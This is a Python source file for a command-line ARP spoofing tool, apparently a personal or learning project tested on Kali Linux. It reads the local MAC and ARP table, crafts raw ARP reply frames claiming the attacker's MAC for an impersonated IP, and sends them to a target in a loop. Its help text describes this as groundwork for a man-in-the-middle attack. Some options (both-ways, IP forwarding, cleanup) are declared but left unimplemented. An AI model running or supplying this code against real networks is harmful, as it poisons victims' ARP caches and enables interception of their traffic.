#!/usr/bin/env python3

# usage: arpspoof.py -t target -i ip [-r rate] [-m mac] [-b] [-f] [-c]
#
# example: ./arpspoof.py -t 192.168.10.1 -i 192.168.10.2
# 
#   tell 192.168.10.1 that our ip address is 192.168.10.2
#   tell 192.168.10.1 that our ip address is 192.168.10.2
#   ...
# 
# OPTIONS
#
#   -h, --help
#       Display this dialogue
#
#   -t, --tell <target>
#       Send this IP address the ARP spoof
#
#   -i, --ip <impersonated-ip>
#       This is the IP we are impersonating
#
#   -m, --mac <impersonating-mac>
#       This is the MAC address to send in the request
#       If it isn't specified, we use our MAC address
#
#   -r, --rate <milliseconds>
#       The rate in milliseconds between sending packets
#
#   -b, --both-ways
#       In addition to the normal ARP spoof sent, a
#       packet will also be sent to the IP we are
#       impersonating in order to assume the identity
#       of the other IP.
#
#   -f, --forward-ip
#       Whether or not this program should modify the
#       system configuration to forward ips
#
#   -c, --cleanup
#       On exit, send correct ARP packets
#
#   --man-in-the-middle
#       Equivalent to using -b, -f, and -c

# Note: Although IP forwarding should be enabled for
# the -b option, I'm not sure how it behaves without it.
# I'm also not sure if it makes sense to control IP
# forwarding from this program, so it is specified as an
# option. It should be as simple as writing a 0 or 1
# to a system file.

import re
import time
import socket
import argparse
import subprocess
from struct import pack

# Here are a few commands that allow you to run a system command
# It isn't actually 'bash' per se, but you are running a shell
# The 'bash' command just gives stdout, don't use it if you want stderr
# Depending on the command used, the [:-1] may not actually be preferable
run_process = lambda cmd: subprocess.run(cmd, stdout = subprocess.PIPE, shell = True)
bash = lambda cmd: run_process(cmd).stdout.decode('utf-8')[:-1]

parser = argparse.ArgumentParser(
    # TODO: Add more of a description. Note: we may also use epilogue and prologue.
    description = 'ARP spoofer',
    formatter_class = lambda prog: argparse.RawTextHelpFormatter(prog, max_help_position=0)
)

parser._action_groups.pop()
required = parser.add_argument_group('required arguments')
optional = parser.add_argument_group('optional arguments')

t_help='''
       Send this IP address the ARP spoof

'''

i_help='''
       This is the IP we are impersonating

'''

r_help='''
       The rate in milliseconds to send ARP packets.

'''

m_help='''
       This is the MAC address to send in the request
       If it isn't specified, we use our MAC address

'''

b_help='''
       In addition to the normal ARP spoof sent, a
       packet will also be sent to the IP we are
       impersonating in order to assume the identity
       of the other IP. This allows for us to make
       a MITM attack, assumping ip forwarding is enabled.

'''

# TODO: Validate the IP address and MAC address (we did this before)
def parse_ip(ip):
    return ip

def parse_mac(mac):
    return mac

# Linux-only solution
# Tested on Kali linux, note this may not necessarily work on other linux platforms
def get_mac():
    mac = bash('cat /sys/class/net/eth0/address')
    return mac

# This can only find the address if it already exists in the table. It does
# not send an arp request if the ip is not known, rather it returns `None`.
# TODO: Test to see what happens when it doesn't exist in the table.
def resolve_addr(lookup_ip):
    table = bash('cat /proc/net/arp | tail --lines=+2')
    for entry in table.splitlines():
        
        # The primary information we need is the ip and and the mac address
        # The other elements might matter, but generally we should be able
        # to assume that the hw_type and device always stay the same. I'm
        # not sure about the other elements really.
        # [ ip, hw_type, flags, hw_addr, mask, device ]
        # ['192.168.10.2', '0x1', '0x2', '00:50:56:f6:c7:3a', '*', 'eth0']
        
        ip, _, _, hw_addr, _, _ = entry.split()
        if ip == lookup_ip:
            return hw_addr

def build_packet(args, actual=False):
    
    hex = lambda x: int(x, 16)
    format_ip = lambda ip: bytes(map(int, ip.split('.')))
    format_mac = lambda mac: bytes(map(hex, mac.split(':')))
    
    target_ip = format_ip(args.target)
    spoofed_ip = format_ip(args.ip)
    our_mac = format_mac(get_mac())
    target_mac = format_mac(resolve_addr(args.target))

    # untested (this would be used if we wanted to cleanup)
    if actual:
        our_mac = format_mac(resolve_addr(args.ip))

    arp_packet = [
        target_mac, our_mac, # Ethernet protcol requires MAC addresses for link layer
        pack('!H', 0x0806),  # Ethtype = ARP
        pack('!H', 0x0001),  # HRD (constant?)
        pack('!H', 0x0800),  # Protocol = Ipv4
        pack('!B', 0x06),    # Hardware Size 
        pack('!B', 0x04),    # Protocol Size
        pack('!H', 0x0002),  # OP    TODO: Should try using OP = 0x0001
        
        # Here we lie and say that our mac address is the resolution of the router IP
        our_mac, spoofed_ip, target_mac, target_ip
    ]
    
    return b''.join(arp_packet)

def send_packet(args):
    # Should we make the interface an argument?
    # Why are we using htons(3) again?
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
    s.bind(("eth0", 0))
    
    # Add an `args.verbose` option?
    print('tell %s that our ip address is %s' % (args.target, args.ip))
    
    # Possible broadcast option?
    # sock.sendto(b''.join(ARP_FRAME), ('255.255.255.255', 0))
    s.send(build_packet(args))
    s.close()

# TODO: Remove or implement args.both, args.mac, args.verbose, etc
def main(args):
    
    while True:
        send_packet(args)
        time.sleep(args.rate / 1000)

if __name__ == "__main__":
    
    required.add_argument('-t', '--tell', dest='target', metavar='target',
        type=parse_ip, help=t_help, required=True)
    
    required.add_argument('-i', '--ip', dest='ip', metavar='ip',
        type=parse_ip, help=i_help, required=True)

    optional.add_argument('-r', '--rate', dest='rate', metavar='rate',
        type=int, default=1000, help=r_help)
    
    optional.add_argument('-m', '--mac', dest='mac', metavar='mac',
        type=parse_mac, help=m_help)
    
    optional.add_argument('-b', '--both-ways', dest='both',
        action='store_true', help=b_help)
    
    args = parser.parse_args()
    
    main(args)

